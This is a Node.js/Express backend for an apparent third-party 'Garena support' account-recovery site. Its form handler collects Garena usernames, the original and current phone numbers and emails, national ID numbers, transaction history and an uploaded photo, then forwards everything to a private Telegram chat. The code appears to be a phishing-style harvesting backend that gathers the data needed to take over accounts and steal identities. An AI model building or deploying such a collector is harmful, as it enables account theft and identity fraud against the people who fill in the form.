/**
 * Backend Server cho Ứng dụng Hỗ trợ Garena
 * @author Dev TanPhat (Professional Coder)
 * @date 2025-11-05
 * Đã sửa lỗi Vercel Read-Only & Static Files (Final V8.0)
 */

// --- Import Dependencies ---
const express = require('express');
const path = require('path');
const multer = require('multer');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');
require('dotenv').config();

// --- Application Constants ---
const app = express();
const PORT = 3000;
const UPLOAD_DIR = '/tmp/uploads_tanphat';

// --- Security & Bot Configuration ---
const REAL_SECRET_KEY = process.env.REAL_SECRET_KEY;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// --- Storage Engine (Multer) ---
if (!fs.existsSync(UPLOAD_DIR)){
    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
}
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, UPLOAD_DIR + '/'),
    filename: (req, file, cb) => {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, uniqueSuffix + '-' + file.originalname);
    }
});
const upload = multer({ storage: storage });

// --- Middleware Configuration ---
// [SỬA LỖI VERCEL] Xóa app.use(express.static(...))
app.use(express.json()); 
app.use(express.urlencoded({ extended: true }));


// --- API Endpoints ---

// [SỬA LỖI] Xử lý thủ công CÁC FILE TĨNH (HTML, CSS, JS)
// 1. Gửi file index.html khi truy cập trang chủ
app.get('/', (req, res) => {
    res.sendFile(path.join(process.cwd(), 'index.html'));
});

// 2. Gửi file style.css
app.get('/style.css', (req, res) => {
    res.sendFile(path.join(process.cwd(), 'style.css'));
});

// 3. Gửi file script.js
app.get('/script.js', (req, res) => {
    res.sendFile(path.join(process.cwd(), 'script.js'));
});


/**
 * [POST] /verify-key
 */
app.post('/verify-key', (req, res) => {
    const { key } = req.body;
    if (!key) {
        return res.status(400).json({ success: false, message: "Không nhận được key." });
    }
    if (key === REAL_SECRET_KEY) {
        console.log(`[AUTH] Xác thực thành công!`);
        res.json({ success: true, message: "Xác thực thành công!" });
    } else {
        console.log(`[AUTH] Key không hợp lệ: ${key}`);
        res.status(401).json({ success: false, message: "Key không hợp lệ." });
    }
});

/**
 * [POST] /submit-form
 */
app.post('/submit-form', (req, res) => {
    // Phải chạy multer upload ở đây
    upload.single('attachment')(req, res, function (err) {
        if (err) {
            console.error("Lỗi Multer:", err);
            return res.status(500).json({ success: false, message: "Lỗi upload file." });
        }
        
        const textData = req.body; 
        const fileData = req.file; 

        console.log("=====================================");
        console.log("🔥 YÊU CẦU HỖ TRỢ MỚI VỪA VỀ! 🔥");
        console.log(textData);
        if (fileData) console.log(`(File đã lưu tại: ${fileData.path})`);
        console.log("=====================================");

        sendTelegramNotification(textData, fileData)
            .catch(err => {
                console.error("[TELEGRAM ERROR]", err.message);
            });

        res.json({ success: true, message: "Đã nhận được yêu cầu của bạn!" });
    });
});

// --- Telegram Service ---

/**
 * Gửi thông báo đến Telegram
 */
async function sendTelegramNotification(textData, fileData) {
    
    const message = formatTelegramMessage(textData);
    const telegramApi = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

    try {
        if (fileData) {
            // --- Kịch bản 1: Gửi Ảnh + Caption ---
            const url = `${telegramApi}/sendPhoto`;
            const form = new FormData();
            
            form.append('chat_id', TELEGRAM_CHAT_ID);
            form.append('caption', message);
            form.append('parse_mode', 'HTML');
            form.append('photo', fs.createReadStream(fileData.path));

            await axios.post(url, form, {
                headers: form.getHeaders()
            });
            console.log("[TELEGRAM] Gửi ảnh và thông báo thành công!");

            fs.unlink(fileData.path, (err) => {
                if (err) console.error("Không xóa được file tạm:", err);
            });

        } else {
            // --- Kịch bản 2: Chỉ gửi Text ---
            const url = `${telegramApi}/sendMessage`;
            await axios.post(url, {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            });
            console.log("[TELEGRAM] Gửi thông báo (text) thành công!");
        }
    } catch (error) {
        console.error("[TELEGRAM ERROR] Không gửi được tin nhắn:");
        if (error.response && error.response.data) {
            console.error(error.response.data.description);
        } else {
            console.error(error.message);
        }
    }
}

/**
 * Định dạng nội dung tin nhắn Telegram
 */
function formatTelegramMessage(data) {
    const f = (field) => (data && data[field]) ? data[field] : '';

    let msg = `<b>🔥 Yêu cầu Hỗ trợ Mới - Dev TanPhat 🔥</b>\n\n`;
    msg += `<b>Tên đăng nhập Garena:</b> <pre>${f('garena-id')}</pre>\n`;
    msg += `<b>Ngày mất TK:</b> ${f('date-lost')}\n\n`;
    msg += `<b>--- Thông tin xác thực gốc ---</b>\n`;
    msg += `<b>SĐT đầu tiên:</b> <pre>${f('first-phone')}</pre>\n`;
    msg += `<b>Email đầu tiên:</b> <pre>${f('first-email')}</pre>\n`;
    msg += `<b>SĐT hiện tại (trước khi mất):</b> <pre>${f('current-phone')}</pre>\n`;
    msg += `<b>Email hiện tại (trước khi mất):</b> <pre>${f('current-email')}</pre>\n`;
    msg += `<b>CCCD trong TK:</b> <pre>${f('account-cccd')}</pre>\n`;
    msg += `<b>Họ tên trong TK:</b> <pre>${f('account-name')}</pre>\n`;
    msg += `<b>Giao dịch nạp:</b>\n<pre>${f('transactions')}</pre>\n\n`;
    msg += `<b>--- Thông tin liên hệ (Khách) ---</b>\n`;
    msg += `<b>Họ tên:</b> ${f('contact-name')}\n`;
    msg += `<b>Email:</b> <pre>${f('contact-email')}</pre>\n`;
    msg += `<b>SĐT:</b> <pre>${f('contact-phone')}</pre>\n`;
    msg += `<b>CCCD (để cập nhật):</b> <pre>${f('contact-cccd')}</pre>\n\n`;
    msg += `<b>--- Chi tiết vấn đề ---</b>\n`;
    msg += `<pre>${f('description')}</pre>\n`;
    return msg;
}

// --- Server Initialization ---
// XUẤT app cho Vercel chạy
module.exports = app;